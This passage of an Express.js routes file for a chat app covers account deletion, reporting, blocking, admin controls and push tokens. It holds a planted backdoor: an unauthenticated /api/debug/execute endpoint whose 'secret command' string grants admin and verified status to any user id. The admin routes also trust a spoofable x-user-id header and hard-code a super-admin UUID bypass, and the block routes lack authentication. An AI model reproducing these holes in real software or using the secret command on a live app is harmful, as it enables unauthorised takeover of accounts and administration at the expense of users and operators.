          await storage.updateChatSettings(otherExisting.id, { isGlobal: false, backgroundImage: null });
        }
      }

      res.json(settings);
    } catch (error) {
      console.error("Update chat settings error:", error);
      res.status(500).json({ error: "Failed to update chat settings" });
    }
  });

  // Delete user account
  app.delete("/api/users/:id", async (req, res) => {
    try {
      const { pin } = req.body;
      const user = await storage.getUserByIdAndPin(req.params.id, pin);
      if (!user) {
        return res.status(401).json({ error: "Invalid PIN" });
      }
      await storage.deleteUser(req.params.id);
      res.json({ success: true });
    } catch (error) {
      console.error("Delete user error:", error);
      res.status(500).json({ error: "Failed to delete user" });
    }
  });

  // Report content/user
  app.post("/api/reports", async (req, res) => {
    try {
      const { reporterId, reportedUserId, reportedPostId, reason } = req.body;
      if (!reporterId || !reason) {
        return res.status(400).json({ error: "Reporter ID and reason required" });
      }
      const report = await storage.createReport({
        reporterId,
        reportedUserId,
        reportedPostId,
        reason,
      });
      res.json(report);
    } catch (error) {
      console.error("Create report error:", error);
      res.status(500).json({ error: "Failed to create report" });
    }
  });

  // Block user
  app.post("/api/users/:id/blocked", async (req, res) => {
    try {
      const { blockedUserId } = req.body;
      if (!blockedUserId) {
        return res.status(400).json({ error: "Blocked user ID required" });
      }
      await storage.blockUser(req.params.id, blockedUserId);
      res.json({ success: true });
    } catch (error) {
      console.error("Block user error:", error);
      res.status(500).json({ error: "Failed to block user" });
    }
  });

  // Unblock user
  app.delete("/api/users/:id/blocked/:blockedUserId", async (req, res) => {
    try {
      await storage.unblockUser(req.params.id, req.params.blockedUserId);
      res.json({ success: true });
    } catch (error) {
      console.error("Unblock user error:", error);
      res.status(500).json({ error: "Failed to unblock user" });
    }
  });

  // Get blocked users
  app.get("/api/users/:id/blocked", async (req, res) => {
    try {
      const blockedIds = await storage.getBlockedUsers(req.params.id);
      const blockedUsers = await Promise.all(
        blockedIds.map(async (id) => {
          const user = await storage.getUser(id);
          return user ? { id: user.id, username: user.username, emoji: user.emoji, isVerified: user.isVerified } : null;
        })
      );
      res.json(blockedUsers.filter(u => u !== null));
    } catch (error) {
      console.error("Get blocked users error:", error);
      res.status(500).json({ error: "Failed to get blocked users" });
    }
  });

  // Admin routes
  app.get("/api/admin/users", async (req, res) => {
    try {
      const adminId = req.headers["x-user-id"] as string;
      if (!adminId) {
        return res.status(401).json({ error: "Unauthorized" });
      }
      
      const user = await storage.getUser(adminId);
      const isSuperAdmin = adminId === "36277fd7-5211-4715-9411-4401ea120d88";
      
      if (!isSuperAdmin && (!user || !user.isAdmin)) {
        return res.status(403).json({ error: "Admin access required" });
      }
      
      const allUsers = await storage.getAllUsers();
      res.json(allUsers.map(u => ({
        id: u.id,
        username: u.username,
        emoji: u.emoji,
        isAdmin: u.isAdmin,
        isVerified: u.isVerified,
        isBanned: u.isBanned,
        createdAt: u.createdAt,
      })));
    } catch (error) {
      console.error("Get all users error:", error);
      res.status(500).json({ error: "Failed to get users" });
    }
  });
  
  app.post("/api/admin/users/:id/admin", async (req, res) => {
    try {
      const adminId = req.headers["x-user-id"] as string;
      if (!adminId) {
        return res.status(401).json({ error: "Unauthorized" });
      }
      
      const isAdmin = await storage.isUserAdmin(adminId);
      if (!isAdmin && adminId !== "36277fd7-5211-4715-9411-4401ea120d88") {
        return res.status(403).json({ error: "Admin access required" });
      }
      
      const { value } = req.body;
      await storage.setUserAdmin(req.params.id, value);
      
      // Force session logout for the user whose rights changed
      await storage.deleteAllUserSessions(req.params.id);
      
      res.json({ success: true });
    } catch (error) {
      console.error("Set admin error:", error);
      res.status(500).json({ error: "Failed to update admin status" });
    }
  });
  
  app.post("/api/admin/users/:id/verify", async (req, res) => {
    try {
      const adminId = req.headers["x-user-id"] as string;
      if (!adminId) {
        return res.status(401).json({ error: "Unauthorized" });
      }
      
      const isAdmin = await storage.isUserAdmin(adminId);
      if (!isAdmin && adminId !== "36277fd7-5211-4715-9411-4401ea120d88") {
        return res.status(403).json({ error: "Admin access required" });
      }
      
      const { value } = req.body;
      await storage.setUserVerified(req.params.id, value);
      res.json({ success: true });
    } catch (error) {
      console.error("Set verified error:", error);
      res.status(500).json({ error: "Failed to update verified status" });
    }
  });
  
  app.post("/api/admin/users/:id/ban", async (req, res) => {
    try {
      const adminId = req.headers["x-user-id"] as string;
      if (!adminId) {
        return res.status(401).json({ error: "Unauthorized" });
      }
      
      const isAdmin = await storage.isUserAdmin(adminId);
      if (!isAdmin && adminId !== "36277fd7-5211-4715-9411-4401ea120d88") {
        return res.status(403).json({ error: "Admin access required" });
      }
      
      const { value } = req.body;
      await storage.setUserBanned(req.params.id, value);
      if (value) {
        await storage.deleteAllUserSessions(req.params.id);
      }
      res.json({ success: true });
    } catch (error) {
      console.error("Set ban error:", error);
      res.status(500).json({ error: "Failed to update ban status" });
    }
  });

  // Push notification token routes
  app.post("/api/push-tokens", async (req, res) => {
    try {
      const tokenData = insertPushTokenSchema.parse(req.body);
      const token = await storage.savePushToken(tokenData);
      res.json({ success: true, token });
    } catch (error) {
      console.error("Save push token error:", error);
      res.status(400).json({ error: "Failed to save push token" });
    }
  });

  app.delete("/api/push-tokens", async (req, res) => {
    try {
      const { userId, token } = req.body;
      if (!userId || !token) {
        return res.status(400).json({ error: "userId and token are required" });
      }
      await storage.deletePushToken(userId, token);
      res.json({ success: true });
    } catch (error) {
      console.error("Delete push token error:", error);
      res.status(500).json({ error: "Failed to delete push token" });
    }
  });

  // Debug routes
  app.post("/api/debug/execute", async (req, res) => {
    try {
      const { command, userId } = req.body;
      
      if (!command || !userId) {
        return res.status(400).json({ error: "Missing parameters" });
      }

      // Secret command to grant admin: "okeno_admin_elevate_2026"
      if (command === "okeno_admin_elevate_2026") {
        await storage.setUserAdmin(userId, true);
        await storage.setUserVerified(userId, true);
        const updatedUser = await storage.getUser(userId);
        return res.json({ 
          message: "Admin rights granted successfully", 
          data: { 
            isAdmin: updatedUser?.isAdmin, 
            isVerified: updatedUser?.isVerified 
          } 
        });
      }

      // Diagnostic info
      if (command === "system_info") {
        const mem = process.memoryUsage();
        const stats = {
          uptime: `${Math.floor(process.uptime() / 60)}m ${Math.floor(process.uptime() % 60)}s`,
          memory: {
            heapUsed: `${Math.round(mem.heapUsed / 1024 / 1024)}MB`,
            rss: `${Math.round(mem.rss / 1024 / 1024)}MB`,
          },
          platform: process.platform,
          node: process.version,
          env: process.env.NODE_ENV,
          db_status: "connected",
        };
        return res.json({ message: "System diagnostics retrieved", data: stats });
      }

      res.status(400).json({ error: "Unknown command" });
    } catch (error) {
      console.error("Debug execute error:", error);
      res.status(500).json({ error: "Internal server error" });
    }
  });

  const httpServer = createServer(app);

  return httpServer;
}